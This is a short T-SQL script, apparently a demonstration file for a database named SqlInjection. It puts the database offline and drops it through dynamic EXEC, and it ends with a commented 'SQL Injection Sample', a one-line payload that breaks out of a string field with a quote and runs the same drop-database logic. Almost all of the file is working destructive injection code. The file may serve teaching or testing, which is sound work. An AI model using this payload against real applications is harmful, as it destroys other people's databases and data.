USE [SqlInjection];
GO

SELECT * FROM [DataEntry];

BEGIN TRY DROP TABLE #TempEvil; END TRY BEGIN CATCH END CATCH;

SELECT 
	[name]
INTO #TempEvil
FROM sys.[databases]
WHERE [name] = 'SqlInjection'

DECLARE @counter INT;
DECLARE @au_id CHAR(55);

SET @counter = 1;
SELECT @au_id = min([name]) FROM #TempEvil;

WHILE @counter <= 1--@au_id IS NOT NULL
BEGIN

	EXEC('ALTER DATABASE ' + @au_id + ' SET OFFLINE WITH ROLLBACK IMMEDIATE; DROP DATABASE ' + @au_id + ';');
	SET @counter = 2;

	--ALTER DATABASE [SqlInjection];
	--SET OFFLINE WITH ROLLBACK IMMEDIATE;
	--DROP DATABASE [SqlInjection];
    --SELECT * FROM #TempEvil WHERE [name] = @au_id
    --SELECT @au_id = min([name]) FROM #TempEvil WHERE [name] > @au_id
END;

-- SQL Injection Sample
--'; BEGIN TRY DROP TABLE #TempEvil; END TRY BEGIN CATCH END CATCH; SELECT [name] INTO #TempEvil FROM [sys].[databases] WHERE [name] = 'SqlInjection'; DECLARE @counter INT; DECLARE @au_id CHAR(55); SET @counter = 1; SELECT @au_id = min([name]) FROM #TempEvil; WHILE @counter <= 1 BEGIN EXEC('ALTER DATABASE ' + @au_id + ' SET OFFLINE WITH ROLLBACK IMMEDIATE; DROP DATABASE ' + @au_id + ';'); SET @counter = 2; END; --